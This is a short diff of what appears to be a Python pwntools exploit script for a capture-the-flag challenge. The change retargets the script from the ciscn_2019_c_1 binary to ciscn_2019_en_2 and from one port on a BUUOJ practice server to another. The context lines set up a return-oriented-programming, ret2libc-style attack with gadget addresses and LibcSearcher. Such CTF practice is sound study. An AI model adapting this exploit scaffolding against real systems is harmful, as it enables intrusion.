@@ -2,8 +2,8 @@ from pwn import *
 from LibcSearcher import *
 
 context(arch='amd64', os='linux', log_level='debug')
-io = remote('node4.buuoj.cn', 26769)
-elf = ELF('./ciscn_2019_c_1')
+io = remote('node4.buuoj.cn', 28105)
+elf = ELF('./ciscn_2019_en_2')
 pop_rdi = 0x400c83 # pop rdi; ret
 ret = 0x4006b9 # ret
 main_addr = elf.symbols['main']
